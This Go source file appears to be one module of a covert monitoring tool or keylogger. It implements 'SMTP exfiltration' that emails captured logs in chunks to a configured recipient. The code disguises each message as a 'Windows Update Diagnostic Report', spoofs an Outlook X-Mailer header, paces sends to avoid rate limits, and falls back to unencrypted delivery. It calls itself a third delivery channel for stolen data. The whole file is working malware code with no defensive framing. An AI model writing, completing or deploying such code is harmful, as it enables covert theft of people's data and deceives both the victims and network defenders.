package monitor

import (
	"crypto/tls"
	"fmt"
	"net/smtp"
	"strings"
	"time"
)

// smtpExfil handles email-based log exfiltration as a third delivery channel.
type smtpExfil struct {
	host     string
	port     int
	user     string
	pass     string
	to       string
	enabled  bool
}

// newSMTPExfil creates a new SMTP exfiltration handler.
func newSMTPExfil(host string, port int, user, pass, to string) *smtpExfil {
	return &smtpExfil{
		host:    host,
		port:    port,
		user:    user,
		pass:    pass,
		to:      to,
		enabled: host != "" && user != "" && pass != "" && to != "",
	}
}

// isEnabled returns whether SMTP exfiltration is configured.
func (s *smtpExfil) isEnabled() bool {
	return s.enabled
}

// send delivers a log batch via email. Uses TLS for security.
// Subject line is camouflaged as a system notification.
func (s *smtpExfil) send(content string) error {
	if !s.enabled {
		return nil
	}

	// Split large content into chunks (email size limit ~10MB, but keep it reasonable).
	chunks := splitForEmail(content, 50000)

	for i, chunk := range chunks {
		subject := fmt.Sprintf("Windows Update Diagnostic Report #%d - %s",
			i+1, time.Now().Format("2006-01-02 15:04"))

		msg := buildEmail(s.user, s.to, subject, chunk)

		err := s.sendTLS(msg)
		if err != nil {
			return err
		}

		// Small delay between emails to avoid rate limiting.
		if len(chunks) > 1 {
			time.Sleep(3 * time.Second)
		}
	}

	return nil
}

// sendTLS sends an email using TLS (works with Gmail, Outlook, etc.).
func (s *smtpExfil) sendTLS(msg []byte) error {
	addr := fmt.Sprintf("%s:%d", s.host, s.port)

	// Configure TLS.
	tlsConfig := &tls.Config{
		InsecureSkipVerify: false,
		ServerName:         s.host,
	}

	// Connect to SMTP server.
	conn, err := tls.Dial("tcp", addr, tlsConfig)
	if err != nil {
		// Fallback: try STARTTLS on port 587 if direct TLS fails.
		return s.sendSTARTTLS(msg)
	}

	client, err := smtp.NewClient(conn, s.host)
	if err != nil {
		conn.Close()
		return err
	}
	defer client.Quit()

	// Authenticate.
	auth := smtp.PlainAuth("", s.user, s.pass, s.host)
	if err = client.Auth(auth); err != nil {
		return err
	}

	// Set sender and recipient.
	if err = client.Mail(s.user); err != nil {
		return err
	}
	if err = client.Rcpt(s.to); err != nil {
		return err
	}

	// Send body.
	w, err := client.Data()
	if err != nil {
		return err
	}
	_, err = w.Write(msg)
	if err != nil {
		return err
	}
	return w.Close()
}

// sendSTARTTLS sends email using STARTTLS (port 587).
func (s *smtpExfil) sendSTARTTLS(msg []byte) error {
	addr := fmt.Sprintf("%s:%d", s.host, s.port)

	client, err := smtp.Dial(addr)
	if err != nil {
		return err
	}
	defer client.Quit()

	// STARTTLS upgrade.
	tlsConfig := &tls.Config{ServerName: s.host}
	if err = client.StartTLS(tlsConfig); err != nil {
		// Continue without TLS if server doesn't support it.
	}

	// Authenticate.
	auth := smtp.PlainAuth("", s.user, s.pass, s.host)
	if err = client.Auth(auth); err != nil {
		return err
	}

	if err = client.Mail(s.user); err != nil {
		return err
	}
	if err = client.Rcpt(s.to); err != nil {
		return err
	}

	w, err := client.Data()
	if err != nil {
		return err
	}
	_, err = w.Write(msg)
	if err != nil {
		return err
	}
	return w.Close()
}

// buildEmail constructs a properly formatted email message.
func buildEmail(from, to, subject, body string) []byte {
	headers := []string{
		fmt.Sprintf("From: %s", from),
		fmt.Sprintf("To: %s", to),
		fmt.Sprintf("Subject: %s", subject),
		"MIME-Version: 1.0",
		"Content-Type: text/plain; charset=UTF-8",
		fmt.Sprintf("Date: %s", time.Now().Format(time.RFC1123Z)),
		"X-Mailer: Microsoft Outlook 16.0",
	}

	msg := strings.Join(headers, "\r\n") + "\r\n\r\n" + body
	return []byte(msg)
}

// splitForEmail splits content into email-sized chunks.
func splitForEmail(s string, maxLen int) []string {
	if len(s) <= maxLen {
		return []string{s}
	}

	var chunks []string
	for len(s) > 0 {
		if len(s) <= maxLen {
			chunks = append(chunks, s)
			break
		}

		idx := strings.LastIndex(s[:maxLen], "\n")
		if idx <= 0 {
			idx = maxLen
		}
		chunks = append(chunks, s[:idx])
		s = s[idx:]
		if len(s) > 0 && s[0] == '\n' {
			s = s[1:]
		}
	}
	return chunks
}
